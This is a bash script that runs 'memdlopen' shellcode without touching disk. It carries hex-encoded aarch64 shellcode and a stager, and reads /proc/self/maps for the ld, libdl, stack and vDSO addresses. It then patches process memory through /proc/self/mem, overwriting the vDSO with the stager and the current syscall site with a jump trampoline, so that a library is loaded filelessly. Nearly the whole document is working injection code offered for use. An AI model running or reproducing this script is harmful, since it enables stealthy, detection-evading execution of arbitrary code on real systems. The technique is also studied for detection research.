### Script to run filelessly the memdlopen shellcode

endian()
{
    echo -n ${1:14:2}${1:12:2}${1:10:2}${1:8:2}${1:6:2}${1:4:2}${1:2:2}${1:0:2}
}

stager="c81b80d2620080d2430480d204008092050080d2f3020010730240b9e10313aa000080d2010000d4f40300aae20301aae10300aae80780d2800080d2010000d42100008b420000eb81ffff54481c80d2e00314aae10313aaa20080d2010000d4800080d2280780d2010000d480021fd6"
sc="600080d2e1018092220080d2c80780d2010000d4600080d2b32d005061820091020280d2080880d2010000d4600080d2280780d2010000d4000080d2010082d2620080d2430480d204008092050080d2c81b80d2010000d4fb0300aa140080d208000014e0031baae10314aa82064091230080d2081b80d2010000d4fb0300aa020082d20100148b000080d2e80780d2010000d4c011f8b79402008b1f0440f120feff54790e40f93b831ff834831df83fff3ea9690f40f929031ef8690080d229200079c0260010e1031baa1801009400001b8b0928c1a86bff9fd2ebffadf23f010beb80000054214000f141ffff5403000014ea0365b30a801ff8490180d2ff7fbfa9290500f1c1ffff54c90f0010e90300f9800080d2e1030091020080d2030180d2c81080d2010000d46a0240f9690640f9410109cb620080d2e00309aa481c80d2010000d464000094410109cba20080d2e00309aa010000d4600c809261220010020080d2080780d2010000d4e40300aa010080d2420080d2c80780d2010000d4050080d2430080d2620080d2e10300aa000080d2c81b80d2010000d4e30300aae00304aa280780d2010000d4e10303aa001f0010dd0000940400038be10303aa401e0010d90000940500038baa1e0030898441b82901058bcc0000947f0100f180000054216000f141ffff543700001489005ff8630a40f96300098b201c0010412080d260003fd6131e0050790e40f920835ff821835df8e81a80d2010000d4050080d2040080924300a0d2430480d2620080d2210480d221cc74d3000080d2c81b80d2010000d40000018b2d835ef8711a40f91f801ff8006000d1000c11cb00ec7c92110000f91f0000913f0200f12001005473e20091138c00f8310600f1a0000054611640383f00007160ffff54fdffff171ffc00a9400080d2010080d2020080d2080380d2010000d4e00000102d035ef82c835ef8ad010c8ba0011fd6dabafa0000000000000080d2c80b80d2010000d4e00309aa0180bad2210040b205000014024440b85f00016b410000541fc01fb81f000aeb63ffff54c0035fd6e91f41f929110091e91f01f9e08753a9e28f54a9e49755a9e8bf40f973150050790e40f9eb6682d21ffd00f1800100541f7903f1400300541fe100f1200700541f4101f1600900541f3d01f1400900541fe500f1c00c0054690000141f000bebe10c00540b0080d234835ff835035ff88c02158b7f0102eba00000548a696b382a682b386b050091fbffff17e29f00f9b502028b35031ff8c0035fd69f000bebe10a0054ed0302aaee0305aa620080d263007c924b0480d263000baa04008092050080d2010000d4df0100f14100005420831ef8e09f00f92b000e8b33835df87f0113eb4900005473020ecb0b0080d234835ff88c020e8b7f0113eba00000548a696b380a682b386b050091fbffff17e2030daa481c80d2010000d4c0035fd6e90301aa2c1540389f0100f1c1ffff54290500d12cfd5f389fbd00f1c1ffff5429050091ea090010fa031eaa2f000094fe031aaa7f0100f121050054150080d235031ff8e06682d2e09f00f9c0035fd6e20301aa1f000beb21040054a9d5bbd2e9dd97f2490000f9c95fb9d2c95797f2490400f9290080d2490800f9a93d90d2491800b95fc001f85f1400f933835df8531800f9090082d2491c00f90a4080d2690aca9a2acd0a9b5f0100f14000005429050091492000f95ffc04a95ffc05a95ffc06a9ff9f00f9c0035fd61f000beb61000054ff9f00f9c0035fd6010000d4e09f00f9c0035fd6ef030aaaec1540382b1540386b010ceb610000549f0100f161ffff54c0035fd6341440f935784079367c40799402018b971a168bf60e40f9d602018be8031eaaea0300aa890240b92901168bedffff977f0100f1c0000054b50600f19402019121ffff54000080d200011fd6811240f9800e40f900011fd66c696261736466002e64796e737472002e64796e73796d002e64796e616d696300646c6f70656e002f6c69622f616172636836342d6c696e75782d676e752f6c6962646c2e736f2e3200"

maps=$(cat /proc/$$/maps)

ld_start_addr=$(echo "$maps" | grep "ld-" | grep " r-xp " | cut -d' ' -f1)
ld_end_addr=0000$(echo $ld_start_addr | cut -d'-' -f2)
sc=$sc$(endian $ld_end_addr)
ld_start_addr=0000$(echo $ld_start_addr | cut -d'-' -f1)
sc=$sc$(endian $ld_start_addr)

libdl=$(echo "$maps" | grep "dl")
libdl=0000$(echo $libdl | cut -d'-' -f1)
sc=$sc$(endian $libdl)

stack_top=$(echo "$maps" | grep -F "[stack]")
stack_top=0000$(echo $stack_top | cut -d' ' -f1 | cut -d'-' -f2)
sc=$sc$(endian $stack_top)

# The shellcode will be written into the vDSO
sc_addr=0000$(echo "$maps" | grep -F "[vdso]" | cut -d'-' -f1)
# Trampoline to jump to the shellcode
jmp="4000005800001fd6"$(endian $sc_addr)
sc_addr=$((0x$sc_addr))

read syscall_info < /proc/self/syscall
addr=$(printf "%u" $(echo $syscall_info | cut -d' ' -f9))
exec 3</proc/self/mem
dd bs=1 skip=$addr count=0 <&3 >/dev/null 2>&1
original=$(od -v -t x1 -N 16 <&3 | head -n -1 |\
           cut -d' ' -f 2- | tr -d ' \n')
sc=$sc$original
exec 3>&-
args=""
for arg in "$@"
do
    args=$args$(printf "%s" "$arg" | od -v -t x1 | head -n -1 |\
                cut -d' ' -f 2- | tr -d ' \n')00
done
sc=$sc$(endian $(printf %016x $#))$args

stager=$stager$(endian $(printf %016x $((${#sc} / 2))))
stager=$(printf $stager | sed -e 's/../\\x&/g')
jmp=$(printf $jmp | sed -e 's/../\\x&/g')
sc=$(printf $sc | sed -e 's/../\\x&/g')

exec 4< <(printf $sc)
exec 3>/proc/self/mem

# Overwrite vDSO with our shellcode
dd bs=1 skip=$sc_addr <&3 >/dev/null 2>&1
printf $stager >&3

exec 3>&-
exec 3>/proc/self/mem

# Write jump instruction where it will be found shortly
dd bs=1 skip=$addr <&3 >/dev/null 2>&1
printf $jmp >&3
